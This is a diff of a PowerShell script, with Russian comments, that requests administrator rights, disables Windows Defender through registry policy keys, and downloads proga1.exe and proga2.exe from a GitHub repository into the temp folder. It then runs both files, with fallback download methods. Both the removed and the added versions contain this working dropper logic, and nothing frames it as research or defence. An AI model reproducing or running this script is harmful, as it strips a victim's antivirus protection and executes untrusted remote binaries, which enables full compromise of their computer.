@@ -1,9 +1,6 @@
-Param(
-    [switch]$shouldAssumeToBeElevated, 
-    [String]$workingDirOverride
-)
+Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)
 
-if (-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
+if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
     $workingDirOverride = (Get-Location).Path 
 }
 
@@ -14,241 +11,127 @@ function Test-Admin {
 
 if ((Test-Admin) -eq $false) {
     if ($shouldAssumeToBeElevated) {
-        Write-Host "ERROR: Elevation failed or was cancelled by user" -ForegroundColor Red
-        Write-Host "Press any key to exit..."
-        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+        Write-Output "Elevating did not work :("
         exit
     } else {
-        Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
-        $scriptPath = $myinvocation.MyCommand.Definition
-        $arguments = "-noprofile -file `"$scriptPath`" -shouldAssumeToBeElevated -workingDirOverride `"$workingDirOverride`""
-        Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
-        exit
+        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
     }
+    exit
 }
 
 Set-Location "$workingDirOverride"
-Write-Host "Working directory: $workingDirOverride" -ForegroundColor Gray
 
-# 1. ОТКЛЮЧЕНИЕ DEFENDER
-Write-Host ""
 Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow
 
 $DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $RealTimeProtectionKey = "Real-Time Protection"
 
 if (!(Test-Path $DefenderPath)) { 
-    New-Item -Path $DefenderPath -Force | Out-Null
-    Write-Host "Created Defender policy path" -ForegroundColor Gray
+    New-Item -Path $DefenderPath -Force 
 }
+New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue
 
-# Отключаем Defender
 try {
     Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
     Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
-    Write-Host "✓ Windows Defender disabled (reboot may be required)" -ForegroundColor Green
+    Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 } catch {
-    Write-Host "✗ Failed to set Defender registry values: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Failed to set registry values: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# Отключаем Real-Time Protection
-try {
-    New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue | Out-Null
-    Set-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
-    Write-Host "✓ Real-time monitoring disabled" -ForegroundColor Green
-} catch {
-    Write-Host "! Could not disable real-time monitoring" -ForegroundColor DarkYellow
-}
-
-# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
 Write-Host ""
 Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow
 
 $temp = $env:TEMP
 $downloaded = 0
 
-# Улучшенная функция скачивания
 function Download-File {
-    param($url, $dest, $fileNumber)
+    param($url, $dest)
     
-    Write-Host "`n[$fileNumber] Downloading: $(Split-Path $dest -Leaf)" -ForegroundColor Cyan
-    
-    # Удаляем старый файл если существует
     if (Test-Path $dest) { 
-        Remove-Item $dest -Force -ErrorAction SilentlyContinue
-        Write-Host "  Removed existing file" -ForegroundColor Gray
+        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
     }
     
-    Write-Host "  URL: $url" -ForegroundColor Gray
-    Write-Host "  Dest: $dest" -ForegroundColor Gray
-    
-    # Проверяем доступность URL перед скачиванием
     try {
-        Write-Host "  Checking if file exists..." -ForegroundColor Gray
-        $request = [System.Net.WebRequest]::Create($url)
-        $request.Method = "HEAD"
-        $request.Timeout = 5000
-        $response = $request.GetResponse()
-        $contentLength = $response.ContentLength
-        $response.Close()
-        Write-Host "  ✓ File exists on server (Size: $contentLength bytes)" -ForegroundColor Green
+        Write-Host "Downloading from: $url" -ForegroundColor Gray
+        Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
+        return $true
     } catch {
-        Write-Host "  ✗ Cannot access file on server: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-    
-    # Пробуем разные методы скачивания
-    $methods = @(
-        @{Name="WebClient"; Script={
-            $webclient = New-Object System.Net.WebClient
-            $webclient.DownloadFile($url, $dest)
-            $webclient.Dispose()
-        }},
-        @{Name="Invoke-WebRequest"; Script={
-            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
-        }},
-        @{Name="BITS"; Script={
-            Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
-        }}
-    )
-    
-    foreach ($method in $methods) {
-        Write-Host "  Trying $($method.Name)..." -ForegroundColor DarkYellow
+        Write-Host "BITS failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
         try {
-            & $method.Script
-            
-            # Проверяем результат
-            if (Test-Path $dest) {
-                $size = (Get-Item $dest).Length
-                if ($size -gt 0) {
-                    $sizeKB = [math]::Round($size / 1KB, 2)
-                    Write-Host "  ✓ SUCCESS via $($method.Name): $size bytes ($sizeKB KB)" -ForegroundColor Green
-                    return $true
-                } else {
-                    Write-Host "  ✗ Downloaded file is empty (0 bytes)" -ForegroundColor Red
-                    Remove-Item $dest -Force -ErrorAction SilentlyContinue
-                }
-            } else {
-                Write-Host "  ✗ File was not created" -ForegroundColor Red
-            }
+            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
+            return $true
         } catch {
-            Write-Host "  ✗ $($method.Name) failed: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "WebRequest failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+            return $false
         }
-        
-        # Небольшая пауза между методами
-        Start-Sleep -Milliseconds 500
     }
-    
-    Write-Host "  ✗ All download methods failed for this file" -ForegroundColor Red
-    return $false
 }
 
-# Проверка интернета
-Write-Host "`nChecking internet connection..." -ForegroundColor Gray
 try {
-    $ping = Test-Connection -ComputerName "github.com" -Count 1 -Quiet -ErrorAction Stop
-    if ($ping) {
-        Write-Host "✓ Internet connection OK" -ForegroundColor Green
-    } else {
-        Write-Host "! Internet connection unstable" -ForegroundColor DarkYellow
-    }
+    $null = Invoke-WebRequest -Uri "https://github.com" -TimeoutSec 5 -UseBasicParsing
+    Write-Host "Internet connection: OK" -ForegroundColor Green
 } catch {
-    Write-Host "! Internet check failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+    Write-Host "WARNING: No internet connection: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# Скачивание первого файла
 $url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
 $dest1 = "$temp\proga1.exe"
 
-if (Download-File $url1 $dest1 "1/2") {
-    $downloaded++
+Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
+if (Download-File $url1 $dest1) {
+    if ((Get-Item $dest1).Length -gt 0) {
+        Write-Host "SUCCESS: proga1.exe downloaded ($((Get-Item $dest1).Length / 1KB) KB)" -ForegroundColor Green
+        $downloaded++
+    } else {
+        Write-Host "FAILED: proga1.exe is empty/corrupt" -ForegroundColor Red
+    }
 } else {
-    Write-Host "  WARNING: Failed to download proga1.exe" -ForegroundColor Red
+    Write-Host "FAILED: proga1.exe" -ForegroundColor Red
 }
 
-# Скачивание второго файла
 $url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
 $dest2 = "$temp\proga2.exe"
 
-if (Download-File $url2 $dest2 "2/2") {
-    $downloaded++
+Write-Host "`n[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
+if (Download-File $url2 $dest2) {
+    if ((Get-Item $dest2).Length -gt 0) {
+        Write-Host "SUCCESS: proga2.exe downloaded ($((Get-Item $dest2).Length / 1KB) KB)" -ForegroundColor Green
+        $downloaded++
+    } else {
+        Write-Host "FAILED: proga2.exe is empty/corrupt" -ForegroundColor Red
+    }
 } else {
-    Write-Host "  WARNING: Failed to download proga2.exe" -ForegroundColor Red
-    
-    # Если второй не скачался, но первый есть - создаем копию
+    Write-Host "WARNING: proga2.exe not found on server" -ForegroundColor Yellow
     if (Test-Path $dest1) {
-        Write-Host "  Creating copy of proga1.exe as proga2.exe..." -ForegroundColor Yellow
         Copy-Item $dest1 $dest2 -Force
-        if (Test-Path $dest2) {
-            Write-Host "  ✓ proga2.exe created as copy" -ForegroundColor Green
-            $downloaded++
-        }
+        Write-Host "Created proga2.exe as copy of proga1.exe" -ForegroundColor Green
+        $downloaded++
+    } else {
+        Write-Host "ERROR: Cannot create proga2.exe (proga1.exe missing)" -ForegroundColor Red
     }
 }
 
-# 3. ЗАПУСК ФАЙЛОВ
 Write-Host ""
 Write-Host "=== Running Files ===" -ForegroundColor Yellow
 
-# Функция для запуска с повторными попытками
-function Start-FileWithRetry {
-    param($filePath, $description)
-    
-    if (Test-Path $filePath) {
-        $fileSize = (Get-Item $filePath).Length
-        Write-Host "Found: $description ($fileSize bytes)" -ForegroundColor Gray
-        
-        # Проверяем, является ли файл исполняемым
-        try {
-            # Запускаем процесс
-            $process = Start-Process -FilePath $filePath -WindowStyle Normal -PassThru
-            Write-Host "✓ $description started (PID: $($process.Id))" -ForegroundColor Green
-            return $true
-        } catch {
-            Write-Host "✗ Failed to start $description: $($_.Exception.Message)" -ForegroundColor Red
-            return $false
-        }
-    } else {
-        Write-Host "✗ $description not found at: $filePath" -ForegroundColor Red
-        return $false
-    }
+if (Test-Path $dest1) {
+    Write-Host "Starting proga1.exe..." -ForegroundColor Green
+    Start-Process -FilePath $dest1 -WindowStyle Normal
+} else {
+    Write-Host "proga1.exe not found!" -ForegroundColor Red
 }
 
-# Небольшая пауза перед запуском
-Start-Sleep -Seconds 1
-
-# Запускаем первый файл
-$result1 = Start-FileWithRetry -filePath $dest1 -description "proga1.exe"
-
-# Пауза между запусками
-if ($result1) {
-    Write-Host "Waiting 2 seconds before starting second file..." -ForegroundColor Gray
-    Start-Sleep -Seconds 2
+if (Test-Path $dest2) {
+    Start-Sleep -Seconds 1
+    Write-Host "Starting proga2.exe..." -ForegroundColor Green
+    Start-Process -FilePath $dest2 -WindowStyle Normal
+} else {
+    Write-Host "proga2.exe not found!" -ForegroundColor Red
 }
 
-# Запускаем второй файл
-$result2 = Start-FileWithRetry -filePath $dest2 -description "proga2.exe"
-
-# 4. ФИНАЛЬНЫЙ ОТЧЕТ
 Write-Host ""
-Write-Host "=========================================" -ForegroundColor Cyan
-Write-Host "            EXECUTION COMPLETE           " -ForegroundColor Cyan
-Write-Host "=========================================" -ForegroundColor Cyan
-Write-Host "Files downloaded: $downloaded/2" -ForegroundColor Yellow
-Write-Host "proga1.exe started: $(if($result1){'YES'}else{'NO'})" -ForegroundColor $(if($result1){'Green'}else{'Red'})
-Write-Host "proga2.exe started: $(if($result2){'YES'}else{'NO'})" -ForegroundColor $(if($result2){'Green'}else{'Red'})
+Write-Host "=== ALL DONE ($downloaded/2 files processed) ===" -ForegroundColor Green
 Write-Host ""
-Write-Host "Temp files location: $temp" -ForegroundColor Gray
-Write-Host "=========================================" -ForegroundColor Cyan
-Write-Host ""
-
-# Даем время на запуск процессов
-Start-Sleep -Seconds 2
-
-# Показываем запущенные процессы
-Write-Host "Running processes from temp:" -ForegroundColor Gray
-Get-Process | Where-Object {$_.Path -like "$temp\*"} | Format-Table Id, ProcessName, Path -AutoSize
-
-Write-Host ""
-Write-Host "Press any key to close this window..." -ForegroundColor Gray
+Write-Host "Press any key to exit..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
